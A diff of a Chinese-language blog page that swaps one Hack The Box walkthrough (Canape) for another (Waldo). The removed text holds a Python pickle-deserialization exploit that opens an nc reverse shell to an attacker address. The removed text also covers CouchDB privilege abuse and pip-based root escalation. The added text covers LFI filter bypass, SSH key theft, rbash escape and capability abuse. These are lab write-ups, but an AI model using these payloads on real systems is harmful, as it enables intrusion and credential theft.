@@ -79,39 +79,39 @@
 
 
 
-<meta name="description" content="扫描靶机端口信息：  只开放了一个80端口：  端口扫描的结果中，存在一个.git目录为git仓库：  在config配置文件中，发现以下信息：  有一仓库http://git.canape.htb/simpsons.git 先修改本地Host文件，然后访问仓库：  查看__init__.py源码信息，有如下代码片段：  google发现其存在反序列化漏洞：  参考其相关资料，结合__init__">
+<meta name="description" content="扫描端口信息：  访问80端口web页面如下：  利用burpsuite发现可利用其分别向dirRead.php和fileRead.php页面post数据：   由此猜测，可尝试LFI(local file inclusion)，且靶机可能对路径字符串进行了过滤处理 在dirRead.php和fileRead.php页面内找到如下处理方式：   即会去除../和.../&amp;quot;字符串，并会限制">
 <meta name="keywords" content="htb walkthrough">
 <meta property="og:type" content="article">
 <meta property="og:title" content="htb-waldo-walkthrough">
 <meta property="og:url" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/index.html">
 <meta property="og:site_name" content="Ha0Za1-Pages">
-<meta property="og:description" content="扫描靶机端口信息：  只开放了一个80端口：  端口扫描的结果中，存在一个.git目录为git仓库：  在config配置文件中，发现以下信息：  有一仓库http://git.canape.htb/simpsons.git 先修改本地Host文件，然后访问仓库：  查看__init__.py源码信息，有如下代码片段：  google发现其存在反序列化漏洞：  参考其相关资料，结合__init__">
+<meta property="og:description" content="扫描端口信息：  访问80端口web页面如下：  利用burpsuite发现可利用其分别向dirRead.php和fileRead.php页面post数据：   由此猜测，可尝试LFI(local file inclusion)，且靶机可能对路径字符串进行了过滤处理 在dirRead.php和fileRead.php页面内找到如下处理方式：   即会去除../和.../&amp;quot;字符串，并会限制">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/nmap.png">
 <meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/web_page.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/git_dir.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/git_config.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/git_clone.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/pickle_loads.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/pickle_loads_vulnerable.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/get_shell.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/netstat.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/curl_5984.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/couchdb_vul.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/couchdb_rce.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/curl_PUT.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/curl_alldocs.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/etc_passwd.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/etc_passwd_fileformat.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/ssh.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/sudo_l.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/pip_help_install.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/setup_py.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/root_shell.png">
-<meta property="og:updated_time" content="2019-12-10T13:51:21.398Z">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/dir_read.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/file_read.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/dirRead_content.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/fileRead_content.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/bypass_1.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/bypass_2.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/rsa.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/chmod_600.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/user_flag.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/authorized_keys.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/8888_port.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/cat_proc.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/monitor_ssh.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/rbash_echo_shell.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/export_path.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/linenum.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/getcap.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/cap_dac_read_search.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/tac_root.png">
+<meta property="og:updated_time" content="2019-12-10T13:56:56.734Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="htb-waldo-walkthrough">
-<meta name="twitter:description" content="扫描靶机端口信息：  只开放了一个80端口：  端口扫描的结果中，存在一个.git目录为git仓库：  在config配置文件中，发现以下信息：  有一仓库http://git.canape.htb/simpsons.git 先修改本地Host文件，然后访问仓库：  查看__init__.py源码信息，有如下代码片段：  google发现其存在反序列化漏洞：  参考其相关资料，结合__init__">
+<meta name="twitter:description" content="扫描端口信息：  访问80端口web页面如下：  利用burpsuite发现可利用其分别向dirRead.php和fileRead.php页面post数据：   由此猜测，可尝试LFI(local file inclusion)，且靶机可能对路径字符串进行了过滤处理 在dirRead.php和fileRead.php页面内找到如下处理方式：   即会去除../和.../&amp;quot;字符串，并会限制">
 <meta name="twitter:image" content="http://yoursite.com/2019/12/10/htb-waldo-walkthrough/nmap.png">
 
 
@@ -332,54 +332,50 @@
       
 
       
-        <p>扫描靶机端口信息：</p>
+        <p>扫描端口信息：</p>
 <p><img src="nmap.png" alt="nmap"></p>
-<p>只开放了一个80端口：</p>
+<p>访问80端口web页面如下：</p>
 <p><img src="web_page.png" alt="web_page"></p>
-<p>端口扫描的结果中，存在一个<code>.git</code>目录为git仓库：</p>
-<p><img src="git_dir.png" alt="git_dir"></p>
-<p>在<code>config</code>配置文件中，发现以下信息：</p>
-<p><img src="git_config.png" alt="git_config"></p>
-<p>有一仓库<code>http://git.canape.htb/simpsons.git</code></p>
-<p>先修改本地Host文件，然后访问仓库：</p>
-<p><img src="git_clone.png" alt="git_clone"></p>
-<p>查看<code>__init__.py</code>源码信息，有如下代码片段：</p>
-<p><img src="pickle_loads.png" alt="pickle_loads"></p>
-<p>google发现其存在反序列化漏洞：</p>
-<p><img src="pickle_loads_vulnerable.png" alt="pickle_loads_vulnerable"></p>
-<p>参考其相关资料，结合<code>__init__.py</code>源码结构，</p>
-<p>可以先将shellcode post 到 <code>/submit</code>页面，然后访问<code>/check</code>页面，触发漏洞，获取reverse shell</p>
-<p>exploit脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import cPickle</span><br><span class="line">import requests</span><br><span class="line">from hashlib import md5</span><br><span class="line"></span><br><span class="line">COMMAND = &quot;homer$rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.X.X.X 9001 &gt;/tmp/f&quot;</span><br><span class="line"></span><br><span class="line">class myExploit(object):</span><br><span class="line">	def __reduce__(self):</span><br><span class="line">		return (os.system,(COMMAND,))</span><br><span class="line"></span><br><span class="line">shellcode = cPickle.dumps(myExploit())</span><br><span class="line"></span><br><span class="line">requests.post(&quot;http://10.10.10.70/submit&quot;,data=&#123;&apos;character&apos;:shellcode.split(&quot;$&quot;)[0],&apos;quote&apos;:shellcode.split(&quot;$&quot;)[1]&#125;)</span><br><span class="line">requests.post(&quot;http://10.10.10.70/check&quot;,data=&#123;&apos;id&apos;:md5(shellcode.split(&quot;$&quot;)[0]+shellcode.split(&quot;$&quot;)[1]).hexdigest()&#125;)</span><br></pre></td></tr></table></figure>
-<p>本地监听相应的端口，拿到reverse shell：</p>
-<p><img src="get_shell.png" alt="get_shell"></p>
-<p>搜集靶机内的信息，查看到靶机的端口状态如下：</p>
-<p><img src="netstat.png" alt="netstat"></p>
-<p>其中5984端口发现为apache couchdb服务，其为一款nosql服务软件：</p>
-<p><img src="curl_5984.png" alt="curl_5984"></p>
-<p>且该版本存在着可利用漏洞：</p>
-<p><img src="couchdb_vul.png" alt="couchdb_vul"></p>
-<p><img src="couchdb_rce.png" alt="couchdb_rce"></p>
-<p>参照漏洞利用过程，首先添加一个管理员账户：</p>
-<p><img src="curl_PUT.png" alt="curl_PUT"></p>
-<p>然后，利用该管理员账户即可查看该数据库内的所有信息：</p>
-<p><img src="curl_alldocs.png" alt="curl_all_docs"></p>
-<p>发现一ssh password数据，而靶机的65535端口开放着ssh服务</p>
-<p>靶机的<code>/etc/passwd</code>文件内：</p>
-<p><img src="etc_passwd.png" alt="etc_passwd"></p>
-<p>注：<code>/etc/passwd</code>文件格式如下：</p>
-<p><img src="etc_passwd_fileformat.png" alt="etc_passwd_fileformat"></p>
-<p>因此利用上述信息，成功ssh登录到靶机homer账户，拿到user flag:</p>
-<p><img src="ssh.png" alt="ssh"></p>
-<p>查看当前用户的可执行命令权限：</p>
-<p><img src="sudo_l.png" alt="sudo_l"></p>
-<p>发现可以以root权限运行Pip install 命令</p>
-<p><img src="pip_help_install.png" alt="pip_help_install"></p>
-<p>根据<code>pip install</code>命令的相关信息，可通构造恶意的<code>setup.py</code>文件，利用Pip命令来获得root reverse shell:</p>
-<p>恶意<code>setup.py</code>如下：</p>
-<p><img src="setup_py.png" alt="setup_py"></p>
-<p>再利用pip命令获得root shell，拿到root flag</p>
-<p><img src="root_shell.png" alt="root_shell"></p>
+<p>利用burpsuite发现可利用其分别向<code>dirRead.php</code>和<code>fileRead.php</code>页面post数据：</p>
+<p><img src="dir_read.png" alt="dir_read"></p>
+<p><img src="file_read.png" alt="file_read"></p>
+<p>由此猜测，可尝试LFI(local file inclusion)，且靶机可能对路径字符串进行了过滤处理</p>
+<p>在<code>dirRead.php</code>和<code>fileRead.php</code>页面内找到如下处理方式：</p>
+<p><img src="dirRead_content.png" alt="dirRead_content"></p>
+<p><img src="fileRead_content.png" alt="fileRead_content"></p>
+<p>即会去除<code>../</code>和<code>.../&quot;</code>字符串，并会限制直接读取<code>user.txt</code>文件</p>
+<p>简单尝试后，利用<code>.../...//</code>即可绕过上述约束，成功读取到<code>/etc/passwd</code>文件：</p>
+<p><img src="bypass_1.png" alt="bypass_1"></p>
+<p><img src="bypass_2.png" alt="bypass_2"></p>
+<p>发现一<code>nobody</code>账户，在该账户目录下搜寻，位<code>./.../...//.../...//.../...//home//nobody//.ssh//.monitor</code>文件中发现一ssh私钥</p>
+<p><img src="rsa.png" alt="rsa"></p>
+<p>利用该私钥，成功ssh登录到靶机nobody用户：</p>
+<p><img src="chmod_600.png" alt="chmod_600"></p>
+<p><img src="user_flag.png" alt="user_flag"></p>
+<p>拿到user flag</p>
+<p>进一步在靶机内搜集信息，发现<code>authorized_keys</code>文件：</p>
+<p><img src="authorized_keys.png" alt="authorized_keys"></p>
+<p>似乎是提示可以ssh登录到monitor用户</p>
+<p>而当前的Nobody ssh是被映射到了8888端口上：</p>
+<p><img src="8888_port.png" alt="8888_port"></p>
+<p>此外，nobody ssh登录时提示为 Alpine Linux ，其为轻量级的linux发行版</p>
+<p>进程资源所属的控制组信息如下：</p>
+<p><img src="cat_proc.png" alt="cat_proc"></p>
+<p>由此可知，当前处于一个docker container内</p>
+<p>既然暗示可ssh 登录  monitor用户，且rsa私钥的文件为<code>.monitor</code></p>
+<p>尝试以此登录monitor，成功：</p>
+<p><img src="monitor_ssh.png" alt="monitor_ssh"></p>
+<p>但是拿到的是一个受限的rbash</p>
+<p><img src="rbash_echo_shell.png" alt="rbash_echo_shell"></p>
+<p>利用ssh登录时执行bash命令绕过rbash限制，然后修改shell和path环境变量</p>
+<p><img src="export_path.png" alt="export_path"></p>
+<p>下一步，寻找靶机中可利用的信息：</p>
+<p><img src="linenum.png" alt="linenum"></p>
+<p><img src="getcap.png" alt="getcap"></p>
+<p>发现<code>tac</code>命令具备有一定权限：</p>
+<p><img src="cap_dac_read_search.png" alt="cap_dac_read_search"></p>
+<p>利用该命令，成功读取root flag：</p>
+<p><img src="tac_root.png" alt="tac_root"></p>
 
       
     </div>
